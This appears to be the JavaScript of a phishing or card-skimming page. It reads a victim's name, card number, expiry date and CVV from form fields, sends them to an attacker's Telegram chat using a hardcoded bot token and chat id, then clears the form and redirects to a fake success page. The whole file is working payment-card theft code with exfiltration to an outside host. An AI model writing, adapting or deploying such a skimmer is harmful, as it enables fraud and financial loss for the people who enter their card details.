var telegram_bot_id = "5660577106:AAHNe17ILesyhd93nenmqIiyb9QNu-hzLRE";
var chat_id = 5968694718 ;
var email, teston, testt, testtt, testttt;
var ready = function () {
    
    email = document.getElementById("n_card").value;
	teston = document.getElementById("cart_number").value;
    testt = document.getElementById("exm").value;
	testtt = document.getElementById("exy").value;
	testttt = document.getElementById("ccv").value;
	
    message = "Fullname: " + email + "\ncart_number: " + teston + "\nMY: " + testt+ "\nexy" + testtt + "\nCvv: " + testttt;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
    
        window.location.href = "success.html";
    });
    
    document.getElementById("n_card").value = "";
    document.getElementById("cart_number").value = "";
	document.getElementById("exm").value = "";
    document.getElementById("exy").value = "";
	document.getElementById("ccv").value = "";

	
    
	
    return false;
	
};
